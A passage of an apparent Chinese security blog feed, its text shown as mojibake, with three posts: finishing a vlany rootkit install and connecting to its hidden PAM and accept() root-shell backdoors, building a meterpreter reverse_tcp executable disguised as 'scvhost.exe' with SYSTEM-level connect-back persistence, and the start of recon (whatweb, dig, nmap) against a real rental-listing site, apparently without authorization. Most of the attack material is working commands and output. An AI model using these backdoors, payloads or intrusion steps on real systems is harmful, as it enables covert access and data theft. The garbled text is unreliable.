ï¼Œç„¶åå†å†å†ä¸€è·¯å›è½¦ï¼Œå‡ºç°å¦‚ä¸‹ç•Œé¢ï¼Œæ˜¯å¦åˆ é™¤ç¼–è¯‘é¡¹ç›®çš„è·¯å¾„ã€‚</p><p><img src="https://kionf.com/article_images/vlany/vlany-08.jpg" alt="vlany-08"></p><p>å®Œæˆåï¼Œè„šæœ¬ä¼šæç¤ºæ˜¯å¦å®‰è£…ä½œè€…æ–°ç ”ç©¶çš„<code>snodew</code>åé—¨è¿™é‡Œé€‰æ‹©<code>NO</code></p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">Installation has finished. Would you like to setup the experimental snodew root reverse shell backdoor? (YES/NO) (<span class="keyword">case</span>-sensitive) [YES]:</div></pre></div></div></figure><h2 id="3-è¿æ¥ä¿¡æ¯"><a href="#3-è¿æ¥ä¿¡æ¯" class="headerlink" title="3. è¿æ¥ä¿¡æ¯"></a>3. è¿æ¥ä¿¡æ¯</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#sshè¿æ¥PAMç”¨æˆ·å</span></div><div class="line">PAM backdoor username: ***REMOVED***</div><div class="line"></div><div class="line"><span class="comment">#PAMç«¯å£</span></div><div class="line">Hidden PAM port: 4397</div><div class="line"></div><div class="line"><span class="comment">#acceptåé—¨éšæœºç«¯å£å·</span></div><div class="line">accept backdoor low port: 271</div><div class="line">accept backdoor high port: 274</div><div class="line"></div><div class="line"><span class="comment">#åé—¨ä½ç½®</span></div><div class="line">Hidden directory: /lib/libc.so.***REMOVED***.14</div><div class="line"></div><div class="line"><span class="comment">#å˜é‡</span></div><div class="line">Environment variable: UVRTBKAYCLWI</div></pre></div></div></figure><p>å…¨éƒ¨é…ç½®å®Œæˆåï¼Œä¼šå‘ˆç°å‡ºå¦‚ä¸Šè¿æ¥ä¿¡æ¯</p><hr><h1 id="0x03-è¿æ¥åé—¨"><a href="#0x03-è¿æ¥åé—¨" class="headerlink" title="0x03 è¿æ¥åé—¨"></a>0x03 è¿æ¥åé—¨</h1><h2 id="1-PAMåé—¨è¿æ¥"><a href="#1-PAMåé—¨è¿æ¥" class="headerlink" title="1. PAMåé—¨è¿æ¥"></a>1. PAMåé—¨è¿æ¥</h2><figure class="highlight shell"><figcaption><span class="caption">ssh</span><span class="suffix">.sh</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></div><div class="code"><pre><div class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></div><div class="line"></div><div class="line"><span class="meta">#</span><span class="bash"> Small bash script designed to allow easy connection to hidden PAM backdoors.</span></div><div class="line"><span class="meta">#</span><span class="bash"> Gets copied to your hidden directory <span class="keyword">in</span> <span class="keyword">case</span> you want to route through more</span></div><div class="line"><span class="meta">#</span><span class="bash"> than one rooted box. :)</span></div><div class="line"></div><div class="line">usage () &#123; echo "$0 &lt;PAM backdoor username&gt; &lt;host&gt; &lt;hidden PAM port&gt;"; exit; &#125;</div><div class="line"></div><div class="line">[ -z $1 ] &amp;&amp; &#123; usage; &#125;</div><div class="line">[ -z $2 ] &amp;&amp; &#123; usage; &#125;</div><div class="line">[ -z $3 ] &amp;&amp; &#123; usage; &#125;</div><div class="line">[ ! -f /usr/bin/socat ] &amp;&amp; &#123; echo "socat isn't installed. exiting."; exit; &#125;</div><div class="line"></div><div class="line">echo "Connecting to PAM backdoor @ host $2 on hidden PAM port $3 as $1"</div><div class="line">read -p "Press enter to continue"</div><div class="line">ssh -o ProxyCommand="socat - tcp4-connect:$2:22,bind=:$3" $2 -l "$1"</div></pre></div></div></figure><p>ä½¿ç”¨å…¶ä»–æœºå™¨è¿æ¥åé—¨ï¼Œç¼–è¾‘æ–‡ä»¶<code>ssh.sh</code>ã€‚</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">sh ssh.sh ***REMOVED*** 192.168.10.35 4397</div></pre></div></div></figure><p>è¿æ¥æˆåŠŸ</p><p><img src="https://kionf.com/article_images/vlany/vlany-09.jpg" alt="vlany-09"></p><p>åœ¨è¢«æ”»å‡»ç«¯æŸ¥çœ‹æ˜¯å¦æœ‰å¼‚å¸¸è¿æ¥ï¼Œå®Œå…¨éšè—æ²¡æœ‰æ˜¾ç¤ºå‡ºä»»ä½•è¿æ¥ä¿¡æ¯ï¼Œå¹¶ä¸”æŸ¥çœ‹<code>/etc/passwd</code>æ–‡ä»¶ï¼Œæ²¡æœ‰æˆ‘ä»¬æ‰€ä½¿ç”¨çš„<code>***REMOVED***</code>ç”¨æˆ·</p><p><img src="https://kionf.com/article_images/vlany/vlany-10.jpg" alt="vlany-10"></p><div class="note danger"><p>æ³¨æ„ï¼š<strong>å¦‚æœä¸ä½¿ç”¨<code>ssh.sh</code>è„šæœ¬è¿æ¥pamåé—¨ï¼Œç›´æ¥ä½¿ç”¨sshè¿æ¥ã€‚è¢«æ”»å‡»ç«¯ä¼šæŸ¥çœ‹åˆ°sshè¿æ¥ä¿¡æ¯</strong></p></div><h2 id="2-accept-åé—¨è¿æ¥"><a href="#2-accept-åé—¨è¿æ¥" class="headerlink" title="2. accept()åé—¨è¿æ¥"></a>2. accept()åé—¨è¿æ¥</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#accept backdoor low port: 271</span></div><div class="line"><span class="comment">#accept backdoor high port: 274</span></div><div class="line"><span class="comment"># -p æŒ‡å®š 271-274 èŒƒå›´å†…ç«¯å£</span></div><div class="line">nc 192.168.10.35 22 -p 271</div><div class="line"><span class="comment">#è¾“å…¥è®¾å®šçš„acceptå¯†ç åå›è½¦</span></div><div class="line">***REMOVED***</div><div class="line"> [+] shell dropped</div></pre></div></div></figure><p><strong>accept()åé—¨åœ¨å®é™…æµ‹è¯•ä¸­æ²¡æœ‰æˆåŠŸï¼Œç”±äºå†…æ ¸ç‰ˆæœ¬ç­‰é—®é¢˜ã€‚</strong></p><hr><h1 id="0x04-æ£€æµ‹"><a href="#0x04-æ£€æµ‹" class="headerlink" title="0x04 æ£€æµ‹"></a>0x04 æ£€æµ‹</h1><figure class="highlight shell"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">git clone https://github.com/mempodippy/detect_preload.git &amp;&amp; cd detect_preload &amp;&amp; ./detect_preload</div></pre></div></div></figure><p>æ‰§è¡Œä»¥ä¸Šå°ç¨‹åºæŸ¥çœ‹è¾“å‡º</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></div><div class="code"><pre><div class="line">[+] finished basic checks</div><div class="line"></div><div class="line">0x7f0144ca2000 /lib64/libdl.so.2</div><div class="line">0x7f014490a000 /lib64/libc.so.6</div><div class="line">0x7f01446ca000 /lib64/libcrypt.so.1</div><div class="line marked">(nil) /lib64/ld-linux-x86-64.so.2</div><div class="line">0x7f01444c2000 /lib64/libfreebl3.so</div></pre></div></div></figure><p>æ­¤ç¨‹åºè·å–åŠ¨æ€è¿æ¥åº“ä¿¡æ¯ï¼Œ<code>ld-linux-x86-64.so.2</code> æ— æ³•è·å–ï¼Œå­˜åœ¨åé—¨ã€‚æ­¤rookitæ¸…ç†åªèƒ½æ›¿æ¢è¢«ä¿®æ”¹çš„æ¶æ„åŠ¨æ€é“¾æ¥åº“</p><blockquote><p>å‚è€ƒï¼š<br>  <a href="https://raw.githubusercontent.com/mempodippy/vlany/master/README_old" target="_blank" rel="noopener">vlany_readme_file</a><br>  <a href="http://haxelion.eu/article/LD_NOT_PRELOADED_FOR_REAL/" target="_blank" rel="noopener">ç³»ç»Ÿå‡½æ•°</a><br>  <a href="https://github.com/mempodippy/vlany/wiki/Features" target="_blank" rel="noopener">vlany_wiki</a></p></blockquote><p>ğŸ‘¿</p>]]></content>
      
      <categories>
          
          <category> Sec </category>
          
          <category> Rookit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Rookit </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>å…³äº meterpreter æŒä¹…åŒ–é—®é¢˜ç ”ç©¶</title>
      <link href="/2018/09/13/metasploit-presistence/"/>
      <url>/2018/09/13/metasploit-presistence/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>meterperter è·å–åˆ°Sessionæ—¶å¦‚æœå½“å‰sessioné€€å‡ºï¼Œå°±ä¸ä¼šåœ¨è‡ªåŠ¨è¿æ¥ï¼Œä½¿ç”¨å¸¸è§æŒä¹…åŒ–ä¹Ÿåªæ˜¯åœ¨è¿œç¨‹ç”¨æˆ·ç™»å½•ï¼Œæˆ–è€…è¿œç¨‹æœºå™¨é‡å¯æ—¶æ‰ä¼šè¿”å›sessionã€‚ä»Šå¤©ä¸»è¦ä»‹ç»<code>persistence</code>è„šæœ¬çš„è‡ªå®šä¹‰é…ç½®ï¼Œæ¥å®ç°å¦‚æœsessionæ–­å¼€ï¼Œå®¢æˆ·ç«¯å®šæ—¶é‡æ–°å°è¯•è¿æ¥æœåŠ¡ç«¯(msfç«¯)</p></blockquote><a id="more"></a><h1 id="0x00-å»ºç«‹è¿æ¥"><a href="#0x00-å»ºç«‹è¿æ¥" class="headerlink" title="0x00 å»ºç«‹è¿æ¥"></a>0x00 å»ºç«‹è¿æ¥</h1><p>æœåŠ¡ç«¯å¯åŠ¨msfå¹¶ç›‘å¬ç«¯å£ç­‰å¾…session</p><figure class="highlight sh"><figcaption><span class="caption">åå°ç›‘å¬ç«¯å£</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></div><div class="code"><pre><div class="line">msf&gt; handler -p windows/meterpreter/reverse_tcp -H 0.0.0.0 -P 33333</div><div class="line"></div><div class="line">msf&gt; <span class="built_in">jobs</span></div><div class="line"></div><div class="line">Jobs</div><div class="line">====</div><div class="line"></div><div class="line">  Id  Name                    Payload                          Payload opts</div><div class="line">  --  ----                    -------                          ------------</div><div class="line">  5   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://0.0.0.0:33333</div></pre></div></div></figure><p>ç”Ÿæˆåé—¨æ–‡ä»¶å®¢æˆ·ç«¯æ‰§è¡Œå»ºç«‹è¿æ¥:</p><figure class="highlight sh"><figcaption><span class="caption">ä¸å…æ€ï¼Œæœ¬æ–‡ä¸åšä»‹ç»</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">msf&gt; msfvenom -p  windows/meterpreter/reverse_tcp lhost=b1g-d1ck.kionf.com lport=33333 -f exe &gt; scvhost.exe</div><div class="line"><span class="comment"># lhostä¸ºè¿œç¨‹ä¸»æœº</span></div><div class="line"><span class="comment"># lportä¸ºè¿œç¨‹ä¸»æœºç«¯å£</span></div></pre></div></div></figure><p><img src="https://kionf.com/article_images/meterpreter-01.jpg" alt="kionf"></p><p>è·å–åˆ°å®¢æˆ·ç«¯<code>session</code>,æŒ‡å®šsession id è¿›å…¥meterpreterä¼šè¯</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">msf&gt; session -i 6</div><div class="line"></div><div class="line">[*] Starting interaction with 6...</div><div class="line"></div><div class="line">meterpreter &gt;</div></pre></div></div></figure><hr><h1 id="0x01-persistenceè„šæœ¬æŒä¹…åŒ–"><a href="#0x01-persistenceè„šæœ¬æŒä¹…åŒ–" class="headerlink" title="0x01 persistenceè„šæœ¬æŒä¹…åŒ–"></a>0x01 persistenceè„šæœ¬æŒä¹…åŒ–</h1><p><br></p><p>å½“ä½¿ç”¨<code>run persistence</code>è¿›è¡ŒæŒä¹…åŒ–æ—¶é»˜è®¤è¿œç¨‹è·¯å¾„ä¼šæ¨é€åˆ°<code>%TEMP%</code>(â€œc:\users\appdata\local\temp\â€œ)ã€‚å½“ç”¨æˆ·é‡å¯æˆ–è€…tempç›®å½•ä¸‹å­˜åœ¨æ•°å­—idï¼Œ<code>persistence</code>æŒä¹…åŒ–å°±ä¼šå‡ºé”™ã€‚</p><div class="note danger"><p>metasploit æ–°ç‰ˆæœ¬å·²ä¸æ¨èä½¿ç”¨æ­¤è„šæœ¬ï¼Œå¹¶ä¸”ä½¿ç”¨<code>run persistence -h</code> æŸ¥çœ‹é€‰é¡¹ä¿¡æ¯æ—¶ä¼šæŠ¥é”™ï¼Œæ‰€ä»¥åˆ†æç›´æ¥è„šæœ¬æ–‡ä»¶</p></div><blockquote><p>åˆ†æ<code>persistence</code>rubyè„šæœ¬æ–‡ä»¶<code>/usr/share/metasploit-framework/scripts/meterpreter/persistence.rb</code></p></blockquote><p>vimæ‰“å¼€<code>:set nu</code>æ˜¾ç¤ºè¡Œå·ï¼Œæ ¹æ®åç§°å¯è‡ªè¡Œåˆ†ææ›´æ”¹é…ç½®</p><figure class="highlight ruby"><figcaption><span class="caption">ä»£ç ç‰‡æ®µï¼Œæ­¤ä»£ç æ®µä¸ºé»˜è®¤é…ç½®</span></figcaption><div class="figcode"><div class="code"><pre><div class="line"><span class="number">14</span> key = <span class="string">"HKLM"</span></div><div class="line"><span class="number">15</span></div><div class="line"><span class="number">16</span> <span class="comment"># Default parameters for payload</span></div><div class="line"><span class="number">17</span> rhost = Rex::Socket.source_address(<span class="string">"b1g-d1ck.kionf.com"</span>)</div><div class="line"><span class="number">18</span> rport = <span class="number">33333</span></div><div class="line"><span class="number">19</span> delay = <span class="number">10</span></div><div class="line"><span class="number">20</span> install = <span class="literal">false</span></div><div class="line"><span class="number">21</span> autoconn = <span class="literal">false</span></div><div class="line"><span class="number">22</span> serv = <span class="literal">false</span></div><div class="line"><span class="number">23</span> altexe = <span class="literal">nil</span></div><div class="line"><span class="number">24</span> target_dir = <span class="literal">nil</span></div><div class="line"><span class="number">25</span> payload_type = <span class="string">"windows/meterpreter/reverse_tcp"</span></div><div class="line"><span class="number">26</span> script = <span class="literal">nil</span></div><div class="line"><span class="number">27</span> script_on_target = <span class="literal">nil</span></div></pre></div></div></figure><p><br></p><figure class="highlight ruby"><figcaption><span class="caption">æ­¤ä»£ç æ®µä¸ºå¸®åŠ©ä¿¡æ¯</span></figcaption><div class="figcode"><div class="code"><pre><div class="line"><span class="number">31</span>   <span class="string">"-h"</span>  =&gt; [ <span class="literal">false</span>,  <span class="string">"This help menu"</span>],</div><div class="line"><span class="number">32</span>   <span class="string">"-r"</span>  =&gt; [ <span class="literal">true</span>,   <span class="string">"The IP of the system running Metasploit listening for the connect back"</span>],</div><div class="line"><span class="number">33</span>   <span class="string">"-p"</span>  =&gt; [ <span class="literal">true</span>,   <span class="string">"The port on which the system running Metasploit is listening"</span>],</div><div class="line"><span class="number">34</span>   <span class="string">"-i"</span>  =&gt; [ <span class="literal">true</span>,   <span class="string">"The interval in seconds between each connection attempt"</span>],</div><div class="line"><span class="number">35</span>   <span class="string">"-X"</span>  =&gt; [ <span class="literal">false</span>,  <span class="string">"Automatically start the agent when the system boots"</span>],</div><div class="line"><span class="number">36</span>   <span class="string">"-U"</span>  =&gt; [ <span class="literal">false</span>,  <span class="string">"Automatically start the agent when the User logs on"</span>],</div><div class="line"><span class="number">37</span>   <span class="string">"-S"</span>  =&gt; [ <span class="literal">false</span>,  <span class="string">"Automatically start the agent on boot as a service (with SYSTEM privileges)"</span>],</div><div class="line"><span class="number">38</span>   <span class="string">"-A"</span>  =&gt; [ <span class="literal">false</span>,  <span class="string">"Automatically start a matching exploit/multi/handler to connect to the agent"</span>],</div><div class="line"><span class="number">39</span>   <span class="string">"-L"</span>  =&gt; [ <span class="literal">true</span>,   <span class="string">"Location in target host to write payload to, if none \%TEMP\% will be used."</span>],</div><div class="line"><span class="number">40</span>   <span class="string">"-T"</span>  =&gt; [ <span class="literal">true</span>,   <span class="string">"Alternate executable template to use"</span>],</div><div class="line"><span class="number">41</span>   <span class="string">"-P"</span>  =&gt; [ <span class="literal">true</span>,   <span class="string">"Payload to use, default is windows/meterpreter/reverse_tcp."</span>]</div></pre></div></div></figure><p><br></p><p>é«˜äº®éƒ¨åˆ†ä¸ºå¸¸ç”¨é…ç½®é¡¹</p><figure class="highlight plain"><figcaption><span class="caption">æ±‰åŒ–ç‰ˆ</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">-h    å¸®åŠ©ä¿¡æ¯</div><div class="line marked">-r    è¿œç¨‹æœåŠ¡ç«¯ç›‘å¬ç«¯å£</div><div class="line marked">-p    è¿œç¨‹æœåŠ¡ç«¯ç›‘å¬ç«¯å£</div><div class="line marked">-i    æ¯éš”å‡ ç§’é‡è¯•è¿æ¥</div><div class="line">-X    æ›´éšç³»ç»Ÿè‡ªå¯åŠ¨</div><div class="line">-U    å½“ç”¨æˆ·ç™»å½•æ—¶è‡ªå¯åŠ¨</div><div class="line">-S    ä½œä¸ºæœåŠ¡å¯åŠ¨</div><div class="line marked">-A    æœåŠ¡ç«¯è‡ªåŠ¨å»ºç«‹handlerç›‘å¬æœåŠ¡</div><div class="line marked">-L    åé—¨ä¼ åˆ°è¿œç¨‹ä¸»æœºçš„ä½ç½®é»˜è®¤ä¸º%TEMP%</div><div class="line">-T    é…ç½®æ¨¡ç‰ˆ</div><div class="line marked">-P    ä½¿ç”¨çš„Payloadï¼Œé»˜è®¤windows/meterpreter/reverse_tcp</div></pre></div></div></figure><p>æ ¹æ®é€‰é¡¹å¸®åŠ©æç¤ºæ‰§è¡ŒæŒä¹…åŒ–å‘½ä»¤ï¼š</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">meterpreter &gt; run persistence -S -i 5 -p 33333 -r b1g-d1ck.kionf.com -L c:\\Windows\\System32</div><div class="line"></div><div class="line"><span class="comment"># è„šæœ¬æ³¨å†Œè‡ªå¯åŠ¨æ³¨å†Œè¡¨ä½ç½®ï¼šHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</span></div></pre></div></div></figure><hr><h1 id="0x02-æµ‹è¯•"><a href="#0x02-æµ‹è¯•" class="headerlink" title="0x02 æµ‹è¯•"></a>0x02 æµ‹è¯•</h1><p>æµ‹è¯•é€€å‡ºå½“å‰sessionã€‚ok 5ç§’åsessionåˆè‡ªåŠ¨è¿æ¥å›æ¥äº†</p><p><img src="https://kionf.com/article_images/meterpreter-02.jpg" alt="kionf"></p><blockquote><p><strong> æ³¨ï¼š</strong></p></blockquote><figure class="highlight sh"><figcaption><span class="caption">å¢åˆ æ”¹æŸ¥æ³¨å…¥è‡ªå¯åŠ¨æ³¨å†Œè¡¨</span></figcaption><div class="figcode"><div class="code"><pre><div class="line"><span class="comment"># æŸ¥è¯¢Key</span></div><div class="line">meterpreter &gt; reg enumkey -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</div><div class="line">Enumerating: HKLM\Software\Microsoft\Windows\CurrentVersion\Run</div><div class="line"></div><div class="line">  Values (3):</div><div class="line"></div><div class="line">        SysTeM32</div><div class="line">        MDxTmrUjRGnvIaT</div><div class="line">        UxMvAJkbedJu</div><div class="line"></div><div class="line"><span class="comment"># æŸ¥è¯¢Values</span></div><div class="line">meterpreter &gt; reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v UxMvAJkbedJu</div><div class="line"></div><div class="line">Key: HKLM\Software\Microsoft\Windows\CurrentVersion\Run</div><div class="line">Name: UxMvAJkbedJu</div><div class="line">Type: REG_SZ</div><div class="line">Data: c:\Windows\System32\ANoZYsNFQVe.vbs</div><div class="line"></div><div class="line"><span class="comment"># åˆ é™¤Values</span></div><div class="line">meterpreter &gt; reg deleteval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v MDxTmrUjRGnvIaT</div><div class="line">Successfully deleted MDxTmrUjRGnvIaT.</div></pre></div></div></figure><blockquote><p>/usr/share/metasploit-framework/scripts/ æ­¤ç›®å½•å­˜æ”¾runè„šæœ¬<br>/usr/share/metasploit-framework/modules/   æ­¤ç›®å½•å­˜æ”¾å„ç§è„šæœ¬<br>æ‡µé€¼çš„æ—¶å€™ç›´æ¥è‡ªå·±è¿›å»çœ‹è„šæœ¬ã€‚</p></blockquote>]]></content>
      
      <categories>
          
          <category> kali </category>
          
          <category> metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> metasploit </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>æ¸—é€æµ‹è¯•å°è®°-ç”±ç§Ÿæˆ¿å¼•å‘çš„æƒ¨æ¡ˆ</title>
      <link href="/2018/09/11/hack-note-00100/"/>
      <url>/2018/09/11/hack-note-00100/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>ä½œä¸ºä¸€åï¼Œæ€€æ£è¿œ(che)å¤§(du)ç†(zi)æƒ³(ne)çš„åŒ—æ¼‚ï¼Œæ°¸è¿œç¦»ä¸å¼€ç§Ÿæˆ¿å­çš„è¯é¢˜ï¼Œ58.é“¾å®¶.æˆ‘çˆ±æˆ‘å®¶â€¦å„ç§ä¸­ä»‹å‘çš„å¿ƒæ…Œï¼Œæƒ³ç›´æ¥æ‰¾ä¸ªæˆ¿ä¸œæ•´ç§Ÿä¸€ä¸ªï¼Œå¶ç„¶é—´äº†è§£åˆ°xxç½‘ç«™æ˜¯ä¸“ä¸ºä¸­ä»‹ç»Ÿè®¡çš„æˆ¿ä¸œæˆ¿æºï¼Œå½“ç„¶æ˜¯èŠ±é’±çš„ï¼ˆMMã€‚ï¼‰ï¼Œé‚å¼•å‘äº†ä»¥ä¸‹æƒ¨æ¡ˆã€‚äººç‹ è¯ä¸å¤šï¼Œæ•´ï¼</p></blockquote><a id="more"></a><h1 id="0x00-ä¿¡æ¯æ”¶é›†"><a href="#0x00-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x00 ä¿¡æ¯æ”¶é›†"></a>0x00 ä¿¡æ¯æ”¶é›†</h1><h2 id="1-oké¦–å…ˆæ‹¿åˆ°ç½‘ç«™åï¼Œå…ˆæ‰“å¼€å®˜ç½‘ç…äº†ç…"><a href="#1-oké¦–å…ˆæ‹¿åˆ°ç½‘ç«™åï¼Œå…ˆæ‰“å¼€å®˜ç½‘ç…äº†ç…" class="headerlink" title="1. oké¦–å…ˆæ‹¿åˆ°ç½‘ç«™åï¼Œå…ˆæ‰“å¼€å®˜ç½‘ç…äº†ç…:"></a>1. oké¦–å…ˆæ‹¿åˆ°ç½‘ç«™åï¼Œå…ˆæ‰“å¼€å®˜ç½‘ç…äº†ç…:</h2><p><img src="https://kionf.com/article_images/hack-note-00100/hack-note-00101.jpg" alt="kionf"></p><p>ç®€å•åˆ†æä¸º<code>PHP</code>å†™çš„ï¼Œæ²¡æœ‰ç™»é™†æˆ¿ä¸œçš„æ‰‹æœºå·ä¸ºæ‰“ç çŠ¶æ€ï¼Œå‡Œæ™¨1ç‚¹åŠçš„æˆ‘ï¼Œè„¸ä¸Šé€æ¸æ¼å‡ºç¬‘å®¹  ï¼šï¼‰</p><h2 id="2-éšä¾¿è¾“å…¥ä¸€ä¸ªåœ°å€ï¼š"><a href="#2-éšä¾¿è¾“å…¥ä¸€ä¸ªåœ°å€ï¼š" class="headerlink" title="2. éšä¾¿è¾“å…¥ä¸€ä¸ªåœ°å€ï¼š"></a>2. éšä¾¿è¾“å…¥ä¸€ä¸ªåœ°å€ï¼š</h2><p><img src="https://kionf.com/article_images/hack-note-00100/hack-note-00102.jpg" alt="kionf"></p><p>çœ‹åˆ°è¿™ä¸ªä¸§é€¼è„¸ï¼Œç»éªŒå‘Šè¯‰æˆ‘TMè¿™å°±æ˜¯ <code>ThinkPhp</code>æ¡†æ¶</p><h2 id="3-åœ¨æä¸ªéšä¾¿è¾“å…¥ä¸ª404åœ°å€"><a href="#3-åœ¨æä¸ªéšä¾¿è¾“å…¥ä¸ª404åœ°å€" class="headerlink" title="3. åœ¨æä¸ªéšä¾¿è¾“å…¥ä¸ª404åœ°å€"></a>3. åœ¨æä¸ªéšä¾¿è¾“å…¥ä¸ª404åœ°å€</h2><p><img src="https://kionf.com/article_images/hack-note-00100/hack-note-00103.jpg" alt="kionf"></p><p>ç»¼åˆä»¥ä¸Šæ‰‹æ’¸ï¼Œåˆ†æå¤§æ¦‚ç¯å¢ƒä¸ºï¼š</p><figure class="highlight plain"><figcaption><span class="caption">ç¯å¢ƒ</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">IIS + ThinkPHP + php + Windows</div></pre></div></div></figure><blockquote><p>æ­¤ç»“æœä¸ºæ‰‹æµ‹ï¼Œç»éªŒä¸è¶³å¯ä»¥ä½¿ç”¨whatwebæ£€æµ‹webç¯å¢ƒ</p></blockquote><figure class="highlight sh"><figcaption><span class="caption">whatweb xxx</span><span class="suffix">.com</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">http://xxx.com/index.php/Manage/Login/index [200 OK] Cookies[BJYADMIN], Country[CHINA][CN], HTML5, HTTPServer[Microsoft-IIS/7.0], IP[115.28.xxx.xxx], JQuery[1.11.1], Microsoft-IIS[7.0], PasswordField[password], Script[JavaScript,javascript,text/javascript], Title[ç®¡ç†ç³»ç»Ÿ], X-Powered-By[thinkphp-bjyadmin, ASP.NET], X-UA-Compatible[IE=edge]</div></pre></div></div></figure><h2 id="4-åŸŸååˆ†æ"><a href="#4-åŸŸååˆ†æ" class="headerlink" title="4. åŸŸååˆ†æ"></a>4. åŸŸååˆ†æ</h2><figure class="highlight sh"><figcaption><span class="caption">dig xxx</span><span class="suffix">.com</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">; &lt;&lt;&gt;&gt; DiG 9.11.3-1-Debian &lt;&lt;&gt;&gt; xxx.com</div><div class="line">;; global options: +cmd</div><div class="line">;; Got answer:</div><div class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 364</div><div class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1</div><div class="line"></div><div class="line">;; OPT PSEUDOSECTION:</div><div class="line">; EDNS: version: 0, flags:; udp: 4096</div><div class="line">;; QUESTION SECTION:</div><div class="line">;lx808.com.INA</div><div class="line"></div><div class="line">;; ANSWER SECTION:</div><div class="line">xxx.com.3599INCNAMEwww.xxx.com.xxx.com.</div><div class="line">www.xxx.com.xxx.com. 3600INA115.28.xxx.xxx</div><div class="line"></div><div class="line">;; Query time: 1370 msec</div><div class="line">;; SERVER: 108.61.10.10<span class="comment">#53(108.61.10.10)</span></div><div class="line">;; WHEN: Tue Sep 11 18:51:58 CST 2018</div><div class="line">;; MSG SIZE  rcvd: 82</div></pre></div></div></figure><p>è·å–åˆ°<code>ipï¼š115.28.xxx.xxx</code>ï¼ŒæŸ¥çœ‹æ˜¯IPç›¸å…³ä¿¡æ¯ï¼š</p><figure class="highlight sh"><figcaption><span class="fileDir">curl cip.cc/</span><span class="caption">115.28.xxx</span><span class="suffix">.xxx</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">IP: 115.28.xxx.xxx</div><div class="line">åœ°å€: ä¸­å›½  å±±ä¸œ  é’å²›</div><div class="line">è¿è¥å•†: é˜¿é‡Œäº‘</div><div class="line"></div><div class="line">æ•°æ®äºŒ: å±±ä¸œçœé’å²›å¸‚ | é˜¿é‡Œå·´å·´ç½‘ç»œæœ‰é™å…¬å¸BGPæ•°æ®ä¸­å¿ƒ</div><div class="line"></div><div class="line">URL: http://www.cip.cc/115.28.xxx.xxx</div></pre></div></div></figure><h2 id="5-ä¸»æœºä¿¡æ¯"><a href="#5-ä¸»æœºä¿¡æ¯" class="headerlink" title="5. ä¸»æœºä¿¡æ¯"></a>5. ä¸»æœºä¿¡æ¯</h2><p>è„šæœ¬å°å­ï¼Œä¸Šï¼<code>nmap</code> æ‰«æ</p><figure class="highlight sh"><figcaption><span class="caption">nmap -sV -T4 -O -F --version-light 115.28.xxx</span><span class="suffix">.xxx</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">Nmap scan report <span class="keyword">for</span> 115.28.xxx.xxx</div><div class="line">Host is up (0.19s latency).</div><div class="line">Not shown: 83 closed ports</div><div class="line">PORT      STATE    SERVICE       VERSION</div><div class="line">25/tcp    filtered smtp</div><div class="line">80/tcp    open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</div><div class="line">135/tcp   filtered msrpc</div><div class="line">139/tcp   filtered netbios-ssn</div><div class="line">445/tcp   filtered microsoft-ds</div><div class="line">1027/tcp  filtered IIS</div><div class="line">1028/tcp  filtered unknown</div><div class="line">3128/tcp  filtered squid-http</div><div class="line">3306/tcp  